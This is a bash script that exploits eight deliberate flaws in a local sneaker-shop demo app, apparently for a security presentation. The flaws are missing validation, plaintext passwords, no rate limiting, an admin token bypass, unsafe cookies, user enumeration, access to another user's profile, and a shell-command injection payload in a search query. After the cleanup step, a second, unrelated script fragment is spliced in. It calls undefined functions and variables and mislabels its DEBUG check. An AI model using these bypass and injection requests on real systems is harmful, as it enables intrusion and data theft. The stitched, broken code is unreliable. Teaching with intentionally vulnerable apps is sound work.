#!/bin/bash

# Script de test pour la démo
# Teste chacune des 8 failles

BASE_URL="http://localhost:3000"
COOKIE_FILE="cookies.txt"

echo "🧪 SNEAKER SHOP - SECURITY TEST SCRIPT"
echo "==========================================="
echo ""

# Check if server is running
if ! curl -s "$BASE_URL" > /dev/null 2>&1; then
  echo "❌ Server not running!"
  echo "Start with: npm start"
  exit 1
fi

echo "✅ Server is running"
echo ""

# FAILLE 1: No validation
echo "-------------------------------------------"
echo "1️⃣  FAILLE 1: No Input Validation"
echo "-------------------------------------------"
echo "Testing: Register with empty fields"
echo ""
curl -X POST "$BASE_URL/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"","email":"","password":""}' \
  -s | jq '.'
echo ""

# FAILLE 2: Plain text passwords
echo "-------------------------------------------"
echo "2️⃣  FAILLE 2: Plain Text Passwords"
echo "-------------------------------------------"
echo "Creating user with plain text password..."
curl -X POST "$BASE_URL/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@test.com","password":"plaintext123"}' \
  -s | jq '.'
echo ""
echo "Check server.js - passwords stored in plain text!"
echo ""

# FAILLE 3: No rate limiting
echo "-------------------------------------------"
echo "3️⃣  FAILLE 3: No Rate Limiting"
echo "-------------------------------------------"
echo "Sending 5 rapid login attempts..."
for i in {1..5}; do
  echo "Attempt $i:"
  curl -s -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@sneakers.com","password":"try'$i'"}' | jq '.error'
done
echo "✅ All succeeded - no throttling!"
echo ""

# FAILLE 4: Admin bypass
echo "-------------------------------------------"
echo "4️⃣  FAILLE 4: Admin Bypass Token"
echo "-------------------------------------------"
echo "Reading ADMIN_TOKEN from .env..."
ADMIN_TOKEN=$(grep "ADMIN_TOKEN=" .env | cut -d= -f2)
echo "Found: $ADMIN_TOKEN"
echo ""
echo "Using token to bypass login..."
curl -s -X POST "$BASE_URL/api/login" \
  -H "Content-Type: application/json" \
  -H "X-Admin-Token: $ADMIN_TOKEN" \
  -d '{"email":"anyone@example.com","password":"anything"}' | jq '.'
echo ""

# FAILLE 5: Unsafe cookies
echo "-------------------------------------------"
echo "5️⃣  FAILLE 5: Unsafe Session Cookies"
echo "-------------------------------------------"
echo "Logging in and checking cookies..."
curl -s -X POST "$BASE_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}' \
  -c $COOKIE_FILE | jq '.'
echo ""
echo "Cookies saved to $COOKIE_FILE:"
cat $COOKIE_FILE
echo ""
echo "Check: secure=false, httpOnly=false ❌"
echo ""

# FAILLE 6: Information disclosure
echo "-------------------------------------------"
echo "6️⃣  FAILLE 6: Information Disclosure"
echo "-------------------------------------------"
echo "Test 1: Wrong password (user exists)"
curl -s -X POST "$BASE_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}' | jq '.error'
echo ""
echo "Test 2: Invalid email (user doesn't exist)"
curl -s -X POST "$BASE_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@example.com","password":"anything"}' | jq '.error'
echo ""
echo "✅ Different messages reveal user existence!"
echo ""

# FAILLE 7: BFLA
echo "-------------------------------------------"
echo "7️⃣  FAILLE 7: BFLA (Broken Function Level Access)"
echo "-------------------------------------------"
echo "Accessing another user's profile with regular user credentials..."
curl -s -b $COOKIE_FILE "$BASE_URL/api/user/2" | jq '.'
echo ""
echo "✅ Saw admin password as normal user!"
echo ""

# FAILLE 8: Command injection
echo "-------------------------------------------"
echo "8️⃣  FAILLE 8: Command Injection"
echo "-------------------------------------------"
echo "Testing command injection in search..."
echo "First, clean up test file if exists..."
rm -f /tmp/pwned 2>/dev/null

echo "Executing search with command injection..."
curl -s -b $COOKIE_FILE \
  "http://localhost:3000/api/shoes/search?q=Nike;%20touch%20/tmp/pwned;%20echo" > /dev/null

echo "Checking if /tmp/pwned was created..."
if [ -f "/tmp/pwned" ]; then
  echo "✅ FILE CREATED - Command injection successful!"
  rm /tmp/pwned
else
  echo "❌ File not created"
fi
echo ""

# SUMMARY
echo "==========================================="
echo "✅ TEST COMPLETE"
echo "==========================================="
echo ""
echo "All 8 vulnerabilities are present and exploitable!"
echo ""
echo "Next steps:"
echo "1. Run: npm start"
echo "2. Open browser: http://localhost:3000"
echo "3. Follow GUIDE.md for live presentation"
echo ""

# Cleanup
rm -f $COOKIE_FILE
if grep -q "DEBUG = False" .env 2>/dev/null; then
  test_pass "DEBUG mode is enabled"
else
  test_fail "DEBUG mode not enabled"
fi
echo ""

# Test 5: HTTPS verify=false
echo "5️⃣  Testing HTTPS Verification Disabled..."
if grep -q "rejectUnauthorized: false" src/server.js; then
  test_pass "Found rejectUnauthorized: false in code"
else
  test_fail "rejectUnauthorized: false not found"
fi
echo ""

# Test 6: Command Injection
echo "6️⃣  Testing Command Injection..."
if grep -q "exec(command" src/server.js; then
  test_pass "Found exec() calls in code"
  if grep -q 'exec.*\${' src/server.js; then
    test_pass "Found exec() with string interpolation (vulnerable)"
  else
    test_fail "No string interpolation in exec()"
  fi
else
  test_fail "No exec() calls found"
fi
echo ""

# Test 7: No Rate Limiting
echo "7️⃣  Testing No Rate Limiting..."
pass_count=0
for i in {1..3}; do
  response=$(curl -s -X POST "$BASE_URL/api/v2/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@example.com\",\"password\":\"test$i\"}")
  
  if echo "$response" | grep -q "error\|token"; then
    ((pass_count++))
  fi
done

if [ $pass_count -eq 3 ]; then
  test_pass "No rate limiting on login (3 consecutive requests accepted)"
else
  test_fail "Rate limiting might be enabled"
fi
echo ""

# Summary
echo "============================================"
echo "Results: ${GREEN}$PASS pass${NC}, ${RED}$FAIL fail${NC}"
echo ""

if [ $FAIL -eq 0 ]; then
  echo -e "${GREEN}✅ All vulnerabilities are present and working!${NC}"
  echo "Application ready."
  exit 0
else
  echo -e "${RED}⚠️  Some vulnerabilities are not working${NC}"
  exit 1
fi
